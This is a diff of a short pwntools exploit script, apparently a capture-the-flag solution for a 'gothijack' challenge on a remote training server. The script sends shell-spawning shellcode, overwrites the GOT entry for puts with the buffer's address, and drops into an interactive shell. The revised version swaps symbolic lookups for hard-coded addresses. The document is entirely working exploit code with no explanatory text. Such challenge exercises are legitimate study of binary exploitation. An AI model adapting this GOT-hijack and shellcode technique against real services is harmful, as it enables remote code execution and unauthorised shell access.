@@ -9,12 +9,11 @@ f = ELF('./gothijack')
 
 p = remote('isc.taiwan-te.ch', 10003)
 
-payload = asm(shellcraft.sh())
-payload += 'A' * 16
-payload += str(f.got['puts'])
-
-p.sendline(payload)
-p.sendline(p64(f.symbols['name']))
+p.sendlineafter('?', asm(shellcraft.sh()))
+sleep(0.5)
+p.sendline('0x601018')
+sleep(0.5)
+p.sendline('0x601080')
 
 p.interactive()
 p.close()
